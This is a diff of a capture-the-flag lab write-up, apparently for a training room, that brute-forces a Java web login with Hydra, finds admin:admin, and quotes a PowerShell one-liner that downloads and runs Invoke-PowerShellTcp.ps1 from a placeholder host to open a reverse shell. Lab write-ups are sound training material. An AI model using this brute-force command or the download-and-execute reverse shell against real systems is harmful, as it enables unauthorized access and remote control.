@@ -46,17 +46,18 @@ But port 8080 has a login form.
 
 
 ## Attack
-I am going to use [[Hydra]] with:
+I am going to use [Hydra](https://www.kali.org/tools/hydra/) with:
 ```
 hydra -s 8080 10.10.12.34 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -L /usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt -P /usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt -t 10 -w 30
 ```
 
-I know to attack  /j_acegi_security_check because I found it from the request via [[Burpsuite]]
+I know to attack  /j_acegi_security_check because I found it from the request via [Burpsuite](https://portswigger.net/)
 And I get <font color=red> admin:admin</font>
 
 Next the room tells me:
 
-Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: _powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_
+Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
+```powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port ```
 
 
 So I logged in
